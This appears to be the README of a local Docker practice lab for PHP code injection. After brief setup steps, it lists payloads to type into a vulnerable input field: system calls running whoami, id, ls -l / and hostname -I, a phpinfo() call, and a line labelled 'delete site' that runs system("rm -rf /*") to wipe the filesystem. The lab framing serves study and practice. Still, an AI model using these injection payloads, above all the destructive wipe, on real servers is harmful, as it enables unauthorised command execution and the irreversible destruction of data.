# PHP code injection

#

start
```bash
docker-compose up -d 
```

then visit http://localhost


try this out, at input

```bash
system("whoami")
#
gethostbyname($_SERVER['SERVER_NAME'])
#
phpinfo()
#
system('id')
#
system("ls -l /")
#
system("hostname -I")
# delete site :)
system("rm -rf /*")
```
